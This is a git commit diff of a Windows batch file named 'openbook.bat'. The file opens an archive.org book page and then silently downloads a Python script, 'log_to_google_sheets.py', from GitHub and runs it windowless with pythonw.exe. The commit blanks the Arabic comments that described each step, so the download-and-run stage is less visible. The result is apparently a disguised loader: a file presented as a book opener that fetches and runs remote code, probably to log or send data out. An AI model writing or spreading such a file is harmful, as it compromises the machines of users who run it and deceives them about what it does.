8458e1977cb829c6fbe95a2ed338da1ca9daf5a5
lolohole <shehhddu5@gmail.com>
2024-10-10 06:40:42 +0300

    Update openbook.bat

--- openbook.bat
+++ openbook.bat
@@ -1,12 +1,10 @@
 @echo off
-:: فتح الكتاب
+::
 start "" "https://archive.org/details/latiatulanovela00unam/mode/2up?ref=ol&view=theater"
 
-
-
-:: تنزيل ملف log_to_google_sheets.py
+:: 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"
 
-:: تشغيل سكريبت البايثون
+:: 
 pythonw.exe log_to_google_sheets.py
 
